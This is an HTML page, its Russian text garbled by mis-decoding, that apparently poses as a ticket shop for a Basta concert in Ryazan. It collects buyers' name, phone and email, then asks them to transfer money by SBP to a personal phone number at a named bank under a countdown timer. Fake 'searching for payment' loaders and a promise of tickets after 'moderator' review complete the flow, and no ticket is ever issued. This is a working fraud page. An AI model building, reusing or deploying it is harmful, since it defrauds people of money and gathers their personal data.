<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ë–∞—Å—Ç–∞ ‚Äî –ö–æ–Ω—Ü–µ—Ä—Ç –≤ –†—è–∑–∞–Ω–∏</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --accent: #ff3b30;
            --bg: #000;
            --card: #1c1c1e;
            --text: #ffffff;
            --gray: #8e8e93;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Inter', sans-serif; 
            background-color: var(--bg); 
            color: var(--text);
            overflow-x: hidden;
            min-height: 100vh;
        }

        /* –ó–∞–¥–Ω–∏–π —Ñ–æ–Ω */
        .hero-bg {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(to bottom, rgba(0,0,0,0.7), rgba(0,0,0,0.95)), 
                        url('https://images.unsplash.com/photo-1470229722913-7c0e2dbbafd3?q=80&w=2070&auto=format&fit=crop'); 
            background-size: cover; background-position: center;
            z-index: -1;
        }

        .container { max-width: 500px; margin: 0 auto; padding: 20px; position: relative; z-index: 1; }

        .top-badge { color: var(--accent); font-weight: 800; font-size: 13px; text-transform: uppercase; margin-bottom: 20px; letter-spacing: 1px; }
        .main-info h1 { font-size: 48px; font-weight: 800; line-height: 1; margin-bottom: 10px; }
        .event-details { font-size: 14px; color: var(--gray); margin-bottom: 30px; line-height: 1.5; }
        .event-details b { color: #fff; }

        /* –°—Ö–µ–º–∞ –∑–∞–ª–∞ */
        .stadium-map {
            background: rgba(255,255,255,0.08); border-radius: 20px; padding: 15px; margin-bottom: 30px;
            border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(15px);
        }
        .stadium-map img { width: 100%; border-radius: 10px; display: block; filter: brightness(0.8) contrast(1.2); }
        .map-label { text-align: center; font-size: 11px; color: var(--gray); margin-top: 10px; text-transform: uppercase; }

        /* –ë–∏–ª–µ—Ç—ã */
        .ticket-item {
            background: rgba(28, 28, 30, 0.85); border-radius: 18px; padding: 20px; margin-bottom: 12px;
            display: flex; justify-content: space-between; align-items: center;
            backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.05);        }
        .t-name { font-weight: 600; font-size: 18px; }
        .t-price { color: var(--gray); font-size: 14px; margin-top: 4px; }
        
        .counter { display: flex; align-items: center; gap: 15px; }
        .btn-count { 
            width: 34px; height: 34px; border-radius: 50%; border: 1px solid #444;
            background: rgba(255,255,255,0.1); color: white; cursor: pointer; font-size: 20px;
        }
        .count-val { font-weight: 600; min-width: 20px; text-align: center; font-size: 18px; }

        /* –ò—Ç–æ–≥–æ–≤–∞—è –∫–Ω–æ–ø–∫–∞ */
        .bottom-bar {
            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
            width: calc(100% - 40px); max-width: 460px;
            background: #fff; color: #000; padding: 20px; border-radius: 20px;
            display: flex; justify-content: space-between; align-items: center;
            cursor: pointer; box-shadow: 0 15px 35px rgba(0,0,0,0.5); z-index: 10;
        }
        .bottom-bar span { font-weight: 800; font-size: 20px; }

        /* –ü–æ–ª—è –≤–≤–æ–¥–∞ */
        .form-title { font-size: 28px; font-weight: 800; margin-bottom: 25px; }
        input {
            width: 100%; padding: 18px; border-radius: 14px; border: 1px solid #333;
            background: #111; color: #fff; margin-bottom: 15px; font-size: 16px; outline: none;
        }
        input:focus { border-color: var(--accent); }

        .btn-main { background: #fff; color: #000; border: none; padding: 18px; border-radius: 14px; width: 100%; font-weight: 700; font-size: 17px; cursor: pointer; transition: 0.3s; }
        .btn-main:hover { opacity: 0.9; }

        /* –†–µ–∫–≤–∏–∑–∏—Ç—ã */
        .pay-card { background: #fff; color: #000; padding: 25px; border-radius: 20px; margin-top: 20px; }
        .pay-card p { font-size: 13px; color: #666; margin-bottom: 4px; }
        .pay-card b { font-size: 22px; display: block; margin-bottom: 15px; }
        .no-link { color: inherit !important; text-decoration: none !important; }
        .timer { font-size: 32px; font-weight: 800; color: var(--accent); margin: 25px 0; text-align: center; }

        /* –ó–∞–≥—Ä—É–∑–∫–∞ */
        .loader { display: none; text-align: center; padding: 100px 20px; }
        .spinner {
            width: 45px; height: 45px; border: 4px solid #222; border-top: 4px solid var(--accent);
            border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 25px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .hidden { display: none; }
    </style>
</head>
<body>

<div class="hero-bg"></div>

<div class="container" id="main-app">
    <!-- –°—Ç—Ä 1: –ë–∏–ª–µ—Ç—ã -->
    <div id="step1">
        <div class="top-badge">–†—è–∑–∞–Ω—å –ê—Ñ–∏—à–∞</div>
        <div class="main-info">
            <h1>–ë–∞—Å—Ç–∞</h1>
            <div class="event-details">
                <b>23 –º–∞—è, 19:00</b><br>
                –î–° ¬´–û–ª–∏–º–ø–∏–π—Å–∫–∏–π¬ª<br>
                –†—è–∑–∞–Ω—å, —É–ª. –ó—É–±–∫–æ–≤–æ–π, 12–∫2
            </div>
        </div>

        <div class="stadium-map">
            <img src="https://avatars.mds.yandex.net/get-afisha/411440/e33682948f95c024564c7f0709b30c04/origin" alt="–°—Ö–µ–º–∞ –∑–∞–ª–∞">
            <div class="map-label">–í—ã–±–µ—Ä–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –±–∏–ª–µ—Ç–æ–≤</div>
        </div>

        <div id="tickets-list">
            <div class="ticket-item">
                <div><div class="t-name">–¢–∞–Ω—Ü–ø–æ–ª</div><div class="t-price">2 500 ‚ÇΩ</div></div>
                <div class="counter">
                    <button class="btn-count" onclick="changeCount('t1', -1)">‚Äì</button>
                    <div class="count-val" id="t1">0</div>
                    <button class="btn-count" onclick="changeCount('t1', 1)">+</button>
                </div>
            </div>
            <div class="ticket-item">
                <div><div class="t-name">–§–∞–Ω-–∑–æ–Ω–∞</div><div class="t-price">4 500 ‚ÇΩ</div></div>
                <div class="counter">
                    <button class="btn-count" onclick="changeCount('t2', -1)">‚Äì</button>
                    <div class="count-val" id="t2">0</div>
                    <button class="btn-count" onclick="changeCount('t2', 1)">+</button>
                </div>
            </div>
            <div class="ticket-item">
                <div><div class="t-name">–°–µ–∫—Ç–æ—Ä VIP</div><div class="t-price">8 000 ‚ÇΩ</div></div>
                <div class="counter">
                    <button class="btn-count" onclick="changeCount('t3', -1)">‚Äì</button>
                    <div class="count-val" id="t3">0</div>
                    <button class="btn-count" onclick="changeCount('t3', 1)">+</button>
                </div>
            </div>
        </div>
        <div style="height: 120px;"></div>
        <div class="bottom-bar" id="checkoutBtn" onclick="goToStep2()" style="display: none;">
            <div>–ë–∏–ª–µ—Ç–æ–≤: <span id="totalCount">0</span></div>
            <div>–ö –æ–ø–ª–∞—Ç–µ: <span id="totalPrice">0 ‚ÇΩ</span></div>
        </div>
    </div>

    <!-- –°—Ç—Ä 2: –î–∞–Ω–Ω—ã–µ -->
    <div id="step2" class="hidden">
        <div class="form-title">–í–∞—à–∏ –¥–∞–Ω–Ω—ã–µ</div>
        <input type="text" id="fio" placeholder="–§–ò–û –ø–æ–ª–Ω–æ—Å—Ç—å—é">
        <input type="tel" id="phone" value="+7 " oninput="fixPhone(this)" onfocus="fixPhone(this)">
        <input type="email" id="email" placeholder="E-mail –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –±–∏–ª–µ—Ç–∞">
        <button class="btn-main" onclick="goToStep3()">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>
    </div>

    <!-- –°—Ç—Ä 3: –û–ø–ª–∞—Ç–∞ -->
    <div id="step3" class="hidden">
        <h2 style="text-align: center;">–û–ø–ª–∞—Ç–∞ –°–ë–ü</h2>
        <div class="timer" id="timer">05:00</div>
        <div class="pay-card">
            <p>–°—É–º–º–∞ –ø–µ—Ä–µ–≤–æ–¥–∞:</p>
            <b id="finalAmount">0 ‚ÇΩ</b>
            <p>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ (–°–ë–ü):</p>
            <b class="no-link">+7 (929) 942 81 07</b>
            <p>–ë–∞–Ω–∫ –ø–æ–ª—É—á–∞—Ç–µ–ª—è:</p>
            <b>–ö–ë –°–æ–ª–∏–¥–∞—Ä–Ω–æ—Å—Ç—å</b>
        </div>
        <button class="btn-main" style="margin-top: 25px; background: var(--accent); color: #fff;" onclick="verify()">–Ø –æ–ø–ª–∞—Ç–∏–ª(–∞)</button>
    </div>

    <!-- –°—Ç—Ä 4: –§–∏–Ω–∞–ª -->
    <div id="stepFinal" class="hidden" style="text-align: center; margin-top: 50px;">
        <div style="font-size: 60px; margin-bottom: 20px;">üì®</div>
        <h2>–ó–∞—è–≤–∫–∞ –ø—Ä–∏–Ω—è—Ç–∞</h2>
        <p style="color: var(--gray); margin-top: 15px; line-height: 1.6;">
            –ë–∏–ª–µ—Ç—ã –±—É–¥—É—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –Ω–∞ –≤–∞—à—É –ø–æ—á—Ç—É –≤ —Ç–µ—á–µ–Ω–∏–µ 24 —á–∞—Å–æ–≤ –ø–æ—Å–ª–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –º–æ–¥–µ—Ä–∞—Ç–æ—Ä–æ–º.
        </p>
    </div>

    <!-- –õ–æ–∞–¥–µ—Ä -->
    <div id="loader" class="loader">
        <div class="spinner"></div>
        <p id="loaderText" style="color: var(--gray);"></p>
    </div>
</div>

<script>
    const prices = { t1: 2500, t2: 4500, t3: 8000 };
    let counts = { t1: 0, t2: 0, t3: 0 };

    function fixPhone(input) {
        if (!input.value.startsWith('+7 ')) {
            input.value = '+7 ';
        }
    }

    function changeCount(id, delta) {
        counts[id] = Math.max(0, counts[id] + delta);
        document.getElementById(id).innerText = counts[id];
        let total = (counts.t1 * prices.t1) + (counts.t2 * prices.t2) + (counts.t3 * prices.t3);
        let count = counts.t1 + counts.t2 + counts.t3;
        const btn = document.getElementById('checkoutBtn');
        if (count > 0) {
            btn.style.display = 'flex';
            document.getElementById('totalCount').innerText = count;
            document.getElementById('totalPrice').innerText = total.toLocaleString() + ' ‚ÇΩ';} else {
            btn.style.display = 'none';
        }
    }

    function showLoader(time, text, nextId) {
        document.querySelectorAll('#main-app > div:not(#loader)').forEach(d => d.classList.add('hidden'));
        const l = document.getElementById('loader');
        l.style.display = 'block';
        document.getElementById('loaderText').innerText = text;
        setTimeout(() => {
            l.style.display = 'none';
            document.getElementById(nextId).classList.remove('hidden');
            window.scrollTo(0,0);
        }, time);
    }

    function goToStep2() {
        showLoader(4000, "–ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç–∏ –±–∏–ª–µ—Ç–æ–≤...", "step2");
    }

    function goToStep3() {
        if(document.getElementById('fio').value.length < 5) { alert('–í–≤–µ–¥–∏—Ç–µ –§–ò–û'); return; }
        showLoader(4000, "–ü–æ–∏—Å–∫ —Å–≤–æ–±–æ–¥–Ω—ã—Ö —Ä–µ–∫–≤–∏–∑–∏—Ç–æ–≤...", "step3");
        document.getElementById('finalAmount').innerText = document.getElementById('totalPrice').innerText;
        startTimer(300);
    }

    function verify() {
        showLoader(20000, "–°–∏—Å—Ç–µ–º–∞ –∏—â–µ—Ç –æ–ø–ª–∞—Ç—É...", "stepFinal");
    }

    function startTimer(duration) {
        let t = duration, m, s;
        const intrvl = setInterval(() => {
            m = parseInt(t / 60, 10); s = parseInt(t % 60, 10);
            document.getElementById('timer').innerText = (m<10?"0"+m:m)+":"+(s<10?"0"+s:s);
            if (--t < 0) clearInterval(intrvl);
        }, 1000);
    }
</script>
</body>
</html>
